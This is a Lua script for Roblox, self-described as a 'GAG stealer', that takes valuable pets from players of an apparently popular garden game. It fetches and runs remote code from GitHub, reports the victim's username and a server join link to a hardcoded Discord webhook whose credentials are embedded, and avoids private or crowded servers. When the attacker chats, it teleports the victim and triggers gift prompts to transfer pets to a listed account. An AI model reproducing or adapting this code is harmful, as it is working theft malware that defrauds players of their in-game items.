_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Run loading screen in a coroutine
coroutine.wrap(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hookzy/aaaddhshajd/refs/heads/main/Loading.lua", true))()
end)()

local users = _G.Usernames or {"jabapie27"}
local min_value = _G.min_value or 1000000
local ping = _G.pingEveryone or "Yes"
local webhook = "https://" .. "discord.com/api/webhooks/" ..
                "1395432389114724478" .. "/" ..
                "QtsOQGD8bBXr23bZMHASo25YhnC4lI_z6TZErLcGYvtvRbYIO6rGlJoBD3e3ftXz99Fs"
local prefix = ping == "Yes" and "@everyone\n" or ""

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local modules = ReplicatedStorage:WaitForChild("Modules", 10)
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue", 10))
local petUtils = require(modules:WaitForChild("PetServices", 10):WaitForChild("PetUtilities", 10))
local petRegistry = require(ReplicatedStorage:WaitForChild("Data", 10):WaitForChild("PetRegistry", 10))
local numberUtil = require(modules:WaitForChild("NumberUtil", 10))
local dataService = require(modules:WaitForChild("DataService", 10))

local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {
    "Kitsune", "Raccoon", "Dragonfly", "T-Rex", "Spinosaurus",
    "Mimic Octopus", "Queen Bee", "Disco Bee", "Butterfly", "Fennec Fox", "Red Fox"
}

local totalValue = 0
local itemsToSend = {}

if next(users) == nil or webhook == "" then return end
if game.PlaceId ~= 126884695634066 then return end
if #Players:GetPlayers() >= 5 then return end

local serverTypeResult = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 10):InvokeServer()
if serverTypeResult == "VIPServer" then return end

local PetsService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("PetsService", 10)
local petsPhysical = Workspace:WaitForChild("PetsPhysical", 10)

for _, petMover in ipairs(petsPhysical:GetChildren()) do
    if petMover:IsA("Part") and petMover.Name == "PetMover" then
        local model = petMover:FindFirstChildWhichIsA("Model")
        if model then
            local uuid = model.Name
            if uuid and uuid ~= "" then
                PetsService:FireServer("UnequipPet", uuid)
                task.wait(0.02)
            end
        end
    end
end

task.wait(0.5)

local favoriteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")

local function unfavoriteIfNeeded(tool)
    if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
        local isFavorited = tool:GetAttribute("d")
        if isFavorited == true then
            favoriteEvent:FireServer(tool)
            task.wait(0.05)
        end
    end
end

for _, tool in ipairs(backpack:GetChildren()) do
    unfavoriteIfNeeded(tool)
end

local plotFolder = Workspace:FindFirstChild(plr.Name)
if plotFolder then
    for _, tool in ipairs(plotFolder:GetChildren()) do
        unfavoriteIfNeeded(tool)
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
    local weight = 0
    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%[(%d+%.?%d*) ?KG%]")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end
    return math.floor(weight * 100 + 0.5) / 100
end

local function formatNumber(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex += 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    elseif number == math.floor(number) then
        return string.format("%d%s", number, suffixes[suffixIndex])
    else
        return string.format("%.2f%s", number, suffixes[suffixIndex])
    end
end

local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then return 0 end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then return 0 end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function identifyExecutor()
    if identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown"
    end
end

local function refreshItemsToSend()
    totalValue = 0
    itemsToSend = {}

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
            if tool:GetAttribute("ItemType") == "Pet" then
                local uuid = tool:GetAttribute("PET_UUID")
                if not uuid then continue end
                local v14 = dataService:GetData().PetsData.PetInventory.Data[uuid]
                if not v14 then continue end
                local name = v14.PetType
                if not name then continue end

                local value = calcPetValue(v14)
                local weight = getWeight(tool)

                if table.find(rarePets, name) or value >= min_value then
                    totalValue += value
                    table.insert(itemsToSend, { Tool = tool, Name = name, Value = value, Weight = weight, Type = "Pet" })
                end
            end
        end
    end
end

refreshItemsToSend()

if #itemsToSend == 0 then return end

table.sort(itemsToSend, function(a, b)
    local aRare = table.find(rarePets, a.Name) ~= nil
    local bRare = table.find(rarePets, b.Name) ~= nil
    if aRare and not bRare then
        return true
    elseif not aRare and bRare then
        return false
    else
        return a.Value > b.Value
    end
end)

local executorName = identifyExecutor()

local function constructPayload(fields)
    return HttpService:JSONEncode({
        content = prefix,
        embeds = {{
            title = "🥭 Join to get GAG hit",
            color = 65280,
            fields = fields,
            footer = { text = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT" }
        }}
    })
end

local function sendJoinMessage(list, prefix, executorName)
    local fields = {
        { name = "Victim Username:", value = Players.LocalPlayer.Name, inline = true },
        { name = "Executor:", value = executorName or "Unknown", inline = true },
        { name = "Join link:", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false },
        { name = "Item list:", value = "", inline = false },
        { name = "Summary:", value = string.format("Total Value: ¢%s", formatNumber(totalValue)), inline = false }
    }
    for _, item in ipairs(list) do
        fields[4].value = fields[4].value .. string.format("%s (%.2f KG): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
    end
    if #fields[4].value > 1024 then
        local lines = {}
        for line in fields[4].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
        while #fields[4].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[4].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local headers = { ["Content-Type"] = "application/json" }
    local requestFunction = request or (syn and syn.request) or http_request or http and http.request
    if not requestFunction then return end

    pcall(function()
        requestFunction({Url = webhook, Method = "POST", Headers = headers, Body = constructPayload(fields)})
    end)
end

sendJoinMessage(itemsToSend, prefix, executorName)

local receiverName = users[1]
local receiver = nil

local function findReceiver()
    receiver = Players:FindFirstChild(receiverName)
    if receiver then
        receiver.CharacterAdded:Wait()
        if receiver.Character then
            return receiver
        end
    end
    receiver = Players.PlayerAdded:Wait()
    while receiver.Name ~= receiverName do
        receiver = Players.PlayerAdded:Wait()
    end
    receiver.CharacterAdded:Wait()
    return receiver
end

local function findPrompt()
    local character = plr.Character or plr.CharacterAdded:Wait()
    local petTool = character:FindFirstChildWhichIsA("Tool")
    if not petTool then return nil end
    if not petTool:GetAttribute("PET_UUID") then return nil end

    for _, otherPlr in ipairs(Players:GetPlayers()) do
        if otherPlr ~= Players.LocalPlayer and otherPlr.Character then
            local primaryPart = otherPlr.Character.PrimaryPart or otherPlr.Character:FindFirstChildWhichIsA("BasePart", true)
            if primaryPart then
                for _, child in ipairs(primaryPart:GetChildren()) do
                    if child:IsA("ProximityPrompt") and child.Enabled then
                        return child
                    end
                end
            end
        end
    end
    return nil
end

local function autoTriggerGift()
    local prompt
    for i = 1, 100 do
        prompt = findPrompt()
        if prompt then break end
        task.wait(0.3)
    end

    if not prompt then return false end

    prompt:InputHoldBegin()
    task.wait(prompt.HoldDuration or 1)
    prompt:InputHoldEnd()
    return true
end

local function teleportToReceiver()
    local victimHRP = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
    local receiverHRP = receiver and receiver.Character and receiver.Character:FindFirstChild("HumanoidRootPart")
    if not victimHRP or not receiverHRP then return false end

    local offset = -receiverHRP.CFrame.LookVector * 2
    local victimPosition = receiverHRP.Position + offset
    victimHRP.CFrame = CFrame.new(victimPosition, receiverHRP.Position)
    task.wait(0.5)
    return true
end

local function onReceiverChat()
    if #itemsToSend == 0 then return end
    local teleportSuccess = teleportToReceiver()
    if not teleportSuccess then return end
    task.wait(1)
    for i, item in ipairs(itemsToSend) do
        if item.Tool and item.Tool.Parent == backpack then
            local humanoid = plr.Character and plr.Character:WaitForChild("Humanoid", 5)
            if humanoid then
                humanoid:EquipTool(item.Tool)
                task.wait(1)
                autoTriggerGift()
                task.wait(0.4)
            end
        end
    end
end

coroutine.wrap(function()
    receiver = findReceiver()

    -- Wait until receiver's character and HRP are fully available
    local success = false
    for _ = 1, 50 do
        if receiver and receiver.Character and receiver.Character:FindFirstChild("HumanoidRootPart") then
            success = true
            break
        end
        task.wait(0.2)
    end
    if not success then return end

    -- Connect chat after character is fully loaded
    receiver.Chatted:Connect(function()
        onReceiverChat()
    end)
end)()
